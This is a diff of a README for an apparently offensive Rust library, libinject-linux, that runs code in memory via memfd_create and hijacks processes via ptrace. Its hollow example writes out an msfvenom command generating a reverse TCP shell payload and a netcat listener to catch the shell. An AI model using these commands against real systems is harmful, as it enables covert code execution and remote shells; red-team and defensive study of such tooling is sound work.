@@ -7,14 +7,13 @@ The following techniques are currently implemented:
 - Using [memfd_create(2)](https://man7.org/linux/man-pages/man2/memfd_create.2.html) to create an anonymous file in memory, write an ELF to it, and then execute.
 - Using [ptrace(2)](https://man7.org/linux/man-pages/man2/ptrace.2.html) to stop a forked process, overwrite its RIP register with shellcode, and then resume it.
 
-## Usage
-### Library
+## Library Usage
 Add `libinject-linux` as a dependency to your Rust project
 ```bash
 cargo add --git https://github.com/dustyw0lf/libinject-linux.git
 ```
 
-### Library examples
+## Library Examples
 >[!note]
 >The examples can take binaries or shellcode from either URLs or filesystem paths.
 
@@ -23,12 +22,24 @@ Clone the repo
 git clone https://github.com/dustyw0lf/libinject-linux.git
 ```
 
-Run the `memfd` example
+Change directory into `libinject-linux`
+```bash
+cd libinject-linux
+```
+
+### memfd
+Run the example
 ```bash
 cargo run --example memfd
 ```
 
-To run the `hollow` example, first `cd libinject-linux/examples` and then generate shellcode, e.g.,
+### hollow
+Change directory into `examples`
+```bash
+cd examples
+```
+
+Use your own shellcode or the provided example
 ```bash
 msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
 ```
@@ -38,7 +49,7 @@ Start a listener
 nc -lvnp 1234
 ```
 
-Run the `hollow` example
+Run the example
 ```bash
 cargo run --example hollow
 ```
